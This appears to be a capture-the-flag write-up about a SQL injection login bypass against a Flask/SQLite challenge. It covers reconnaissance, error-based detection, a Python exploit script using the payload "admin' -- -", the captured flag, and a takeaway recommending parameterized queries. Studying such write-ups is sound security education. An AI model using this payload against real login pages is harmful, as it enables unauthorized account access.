# SQL Injection — Login Bypass

> **Event:** Example CTF 2025  
> **Category:** Web  
> **Difficulty:** Medium  
> **Points:** 200  
> **Solved:** Yes ✅

---

## 📋 Challenge Description

> "Our new login system is completely secure. Can you prove us wrong?"

**Given:** `http://web.example-ctf.com:5000`

---

## 🔍 Reconnaissance

I started by visiting the login page. It was a simple username/password form with no visible security mechanisms.

```bash
# Checked response headers
curl -I http://web.example-ctf.com:5000
```

Noticed:
- No rate limiting
- Verbose error messages on failed login
- `Server: Flask/2.0` header leaking backend info

---

## 💡 Identifying the Vulnerability

Testing a single quote `'` in the username field returned an SQL error:

```
sqlite3.OperationalError: unrecognized token: "'''"
```

This confirmed the input was being passed directly into an SQL query without sanitization — a classic SQL injection vulnerability.

---

## 🚀 Exploitation

Used a basic authentication bypass payload:

```python
# exploit.py
import requests

url = "http://web.example-ctf.com:5000/login"
payload = {
    "username": "admin' -- -",
    "password": "anything"
}

r = requests.post(url, data=payload)
print(r.text)
```

The `-- -` comments out the rest of the SQL query, bypassing the password check entirely.

**Output:**
```html
<h1>Welcome back, admin!</h1>
<p>Your flag: CTF{sql_1nj3ct10n_b4sics_101}</p>
```

---

## 🚩 Flag

```
CTF{sql_1nj3ct10n_b4sics_101}
```

---

## 🧠 Key Takeaways

- Always test for SQL injection with a single quote — error messages are very revealing.
- `-- -` is a reliable comment sequence for SQLite and MySQL.
- Parameterized queries would have completely prevented this vulnerability.

**References:**
- [PortSwigger SQL Injection Guide](https://portswigger.net/web-security/sql-injection)
- [PayloadsAllTheThings - SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
